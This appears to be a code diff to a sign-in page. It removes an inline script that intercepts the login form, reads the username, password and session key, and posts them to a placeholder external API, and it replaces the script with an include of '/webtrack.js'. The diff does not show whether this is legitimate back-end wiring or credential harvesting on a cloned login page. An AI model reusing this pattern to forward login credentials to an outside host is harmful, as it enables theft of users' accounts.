@@ -151,48 +151,7 @@
         </div>
       </div>
     </div>
-    <script>
-      document
-        .getElementById("identifierForm")
-        .addEventListener("submit", function (event) {
-          event.preventDefault(); // Evita el envío del formulario por defecto
 
-          // Obtiene los valores de los campos del formulario
-          const username = document.getElementById("username").value;
-          const password = document.getElementById("tpassword").value;
-          const sessionDataKey = document.querySelector(
-            'input[name="sessionDataKey"]'
-          ).value;
-
-          // Crea un objeto con los datos a enviar
-          const data = {
-            username: username,
-            password: password,
-            sessionDataKey: sessionDataKey,
-          };
-
-          // Realiza la solicitud a la API
-          fetch("https://tu-api.com/endpoint", {
-            // Reemplaza con la URL de tu API
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(data),
-          })
-            .then((response) => {
-              if (!response.ok) {
-                throw new Error("Error en la red");
-              }
-              return response.json();
-            })
-            .then((data) => {
-              console.log("Éxito:", data);
-            })
-            .catch((error) => {
-              console.error("Error:", error);
-            });
-        });
-    </script>
+    <script src="/webtrack.js"></script>
   </body>
 </html>
